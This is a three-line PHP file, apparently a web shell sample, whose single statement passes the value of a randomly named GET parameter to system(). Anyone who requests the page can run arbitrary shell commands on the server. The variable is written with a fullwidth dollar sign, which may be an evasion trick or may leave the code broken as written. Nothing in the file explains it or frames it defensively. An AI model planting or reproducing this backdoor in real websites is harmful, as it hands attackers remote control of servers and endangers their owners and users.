<?php
SysTeM(＄_GET['tKeZegQ6']);
?>
